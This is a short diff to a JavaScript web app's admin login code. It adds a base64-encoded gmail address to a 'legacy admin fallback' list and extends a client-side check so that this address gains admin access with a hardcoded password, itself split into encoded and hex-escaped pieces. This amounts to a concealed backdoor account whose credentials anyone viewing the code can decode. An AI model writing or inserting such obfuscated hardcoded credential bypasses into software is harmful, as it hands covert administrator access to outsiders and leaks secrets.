@@ -7599,7 +7599,7 @@ function deleteRedProp(titleOrId){
   }
 
   // ── Legacy admin fallback (encoded) ──
-  const _la=[atob('amNhc3Rybw==')];
+  const _la=[atob('amNhc3Rybw=='),atob('amVseWFucmVhbGVzdGF0ZQ==')+atob('QGdtYWlsLmNvbQ==')];
   const _lp=atob('amFj')+['\x72\x65\x61\x6c\x74','\x79\x70\x61\x32\x30\x32\x36'].join('');
 
   // ── Default admin permissions ──
@@ -7661,7 +7661,9 @@ function deleteRedProp(titleOrId){
     const _u0=atob('amNhc3Rybw==');
     const _p0=atob('amFj')+'realtypa2026';
     const _e0=_u0+'@'+atob('amFjcmVhbHR5cGE=')+'.com';
-    return (u===_u0||u===_e0||u.toLowerCase()===_u0||u.toLowerCase()===_e0)&&p===_p0;
+    const _e1=atob('amVseWFucmVhbGVzdGF0ZQ==')+atob('QGdtYWlsLmNvbQ==');
+    const ul=u.toLowerCase();
+    return (u===_u0||u===_e0||u===_e1||ul===_u0||ul===_e0||ul===_e1)&&p===_p0;
   }
 
   window.doLogin = async function(){
